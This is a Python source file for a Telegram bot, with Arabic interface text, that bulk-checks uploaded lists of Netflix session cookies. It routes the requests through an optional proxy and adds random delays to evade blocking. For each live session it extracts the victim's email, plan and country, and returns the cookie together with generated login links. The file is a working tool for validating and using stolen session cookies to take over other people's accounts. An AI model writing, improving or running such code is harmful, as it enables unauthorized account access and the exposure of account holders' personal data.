import os, re, json, base64, time, random
from datetime import datetime
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
from concurrent.futures import ThreadPoolExecutor, as_completed

TOKEN = os.environ.get("BOT_TOKEN")
PROXY = os.environ.get("PROXY", None)  # ← البروكسي اختياري

# ========== دالة الفحص (باستخدام البروكسي إن وجد) ==========
def check_cookie(cookie):
    try:
        sess = requests.Session()
        proxies = {"http": PROXY, "https": PROXY} if PROXY else None

        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": cookie,
            "Referer": "https://www.netflix.com/",
        }
        sess.get("https://www.netflix.com/", headers=headers, timeout=15, allow_redirects=True, proxies=proxies)
        time.sleep(random.uniform(1.0, 2.0))
        sess.get("https://www.netflix.com/", headers=headers, timeout=15, allow_redirects=True, proxies=proxies)
        time.sleep(random.uniform(0.5, 1.5))
        r = sess.get(
            "https://www.netflix.com/YourAccount",
            headers=headers,
            timeout=20,
            allow_redirects=True,
            max_redirects=5,
            proxies=proxies
        )
        final_url = r.url.lower()
        result = {"status": "unknown", "cookie": cookie, "details": {}, "api_tokens": {}}
        if "login" in final_url:
            result["status"] = "invalid"
            return result
        text = r.text
        if "membershipStatus" in text or "profiles" in text or "gps" in text:
            result["status"] = "valid"
            try:
                data_match = re.search(r"window\.__netflix\.reactContext\s*=\s*({.*?});", text, re.DOTALL)
                if data_match:
                    data = json.loads(data_match.group(1))
                    user_info = data.get("models", {}).get("userInfo", {}).get("data", {}) or \
                                data.get("models", {}).get("serverModel", {}).get("data", {}).get("userInfo", {})
                    result["details"] = {
                        "email": user_info.get("email", ""),
                        "membership": user_info.get("membershipStatus", ""),
                        "plan": user_info.get("plan", {}).get("planName", ""),
                        "country": user_info.get("countryOfSignup", "")
                    }
                else:
                    em = re.search(r'"email"\s*:\s*"([^"]+)"', text)
                    mm = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', text)
                    result["details"] = {
                        "email": em.group(1) if em else "",
                        "membership": mm.group(1) if mm else ""
                    }
            except:
                pass
            nid = re.search(r"NetflixId=([^;]+)", cookie)
            sid = re.search(r"SecureNetflixId=([^;]+)", cookie)
            if nid and sid:
                payload = {"netflixId": nid.group(1), "secureNetflixId": sid.group(1), "timestamp": datetime.now().isoformat()}
                token = base64.b64encode(json.dumps(payload).encode()).decode().replace("+", "-").replace("/", "_").replace("=", "")
                result["api_tokens"] = {
                    "api_token": token,
                    "direct_links": {
                        "computer": {"name": "💻 كمبيوتر", "url": f"https://www.netflix.com/Login?apiToken={token}"},
                        "android": {"name": "🤖 أندرويد", "url": f"https://www.netflix.com/Login?apiToken={token}&deviceType=android"},
                        "ios": {"name": "🍎 آيفون", "url": f"https://www.netflix.com/Login?apiToken={token}&deviceType=ios"},
                        "tv": {"name": "📺 تلفاز", "url": f"https://www.netflix.com/tv/login?apiToken={token}"}
                    }
                }
        else:
            result["status"] = "error"
        return result
    except Exception as e:
        return {"status": "error", "cookie": cookie}

# ========== استخراج الكوكيز من TXT ==========
def extract_cookies_from_txt(file_bytes):
    content = file_bytes.decode("utf-8", errors="ignore")
    return [line.strip() for line in content.splitlines() if "=" in line.strip()]

# ========== أوامر البوت (بدون تغيير) ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 أهلاً بك في بوت فحص كوكيز Netflix\n\n"
        "📤 أرسل ملف .txt يحتوي على الكوكيز (كل كوكيز في سطر).\n"
        "🔍 سيتم الفحص فوراً وإرسال الحسابات الصالحة فقط.\n\n"
        "⚠️ لتجنب الحظر، تأكد من إضافة بروكسي (اختياري)."
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc:
        return
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("❌ الرجاء إرسال ملف .txt فقط")
        return
    await update.message.reply_text("⏳ جاري استخراج الكوكيز...")
    file = await context.bot.get_file(doc.file_id)
    file_bytes = await file.download_as_bytearray()
    cookies = extract_cookies_from_txt(bytes(file_bytes))
    if not cookies:
        await update.message.reply_text("❌ لم يتم العثور على كوكيز صالحة في الملف")
        return
    unique_cookies = list(dict.fromkeys(cookies))
    await update.message.reply_text(f"🔍 جاري فحص {len(unique_cookies)} كوكيز...")
    valid_results = []
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = {executor.submit(check_cookie, c): c for c in unique_cookies}
        for future in as_completed(futures):
            res = future.result()
            if res.get("status") == "valid":
                valid_results.append(res)
    elapsed = time.time() - start_time
    invalid = len(unique_cookies) - len(valid_results)
    await update.message.reply_text(
        f"✅ انتهى الفحص في {elapsed:.1f} ثانية.\n"
        f"📊 صالحة: {len(valid_results)}\n"
        f"❌ غير صالحة: {invalid}"
    )
    if valid_results:
        for i, acc in enumerate(valid_results, 1):
            details = acc.get("details", {})
            tokens = acc.get("api_tokens", {})
            direct = tokens.get("direct_links", {})
            cookie = acc.get("cookie", "")
            api_token = tokens.get("api_token", "")
            msg = (
                f"🎉 *حساب صالح #{i}*\n\n"
                f"📧 *البريد:* `{details.get('email', 'غير معروف')}`\n"
                f"👑 *العضوية:* `{details.get('membership', 'غير معروف')}`\n"
                f"💎 *الباقة:* `{details.get('plan', 'غير معروف')}`\n"
                f"🌍 *البلد:* `{details.get('country', 'غير معروف')}`\n\n"
                f"🔗 *رابط الكمبيوتر:* [اضغط هنا]({direct.get('computer', {}).get('url', '')})\n"
                f"🤖 *رابط أندرويد:* [اضغط هنا]({direct.get('android', {}).get('url', '')})\n"
                f"🍎 *رابط آيفون:* [اضغط هنا]({direct.get('ios', {}).get('url', '')})\n"
                f"📺 *رابط التلفاز:* [اضغط هنا]({direct.get('tv', {}).get('url', '')})\n\n"
                f"🔑 *ApiToken:* `{api_token}`\n\n"
                f"🍪 *الكوكيز:* `{cookie}`"
            )
            keyboard = [
                [InlineKeyboardButton("📋 نسخ الكوكيز", callback_data=f"copy_{i}_cookie")],
                [InlineKeyboardButton("🔑 نسخ ApiToken", callback_data=f"copy_{i}_token")]
            ]
            await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard), disable_web_page_preview=True)
    else:
        await update.message.reply_text("😢 لا توجد حسابات صالحة. قد يكون عنوان IP محظوراً من Netflix. جرب إضافة بروكسي.")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer("استخدم الضغط المطول على النص لنسخه.")

def main():
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, start))
    print("✅ البوت يعمل...")
    application.run_polling()

if __name__ == "__main__":
    main()
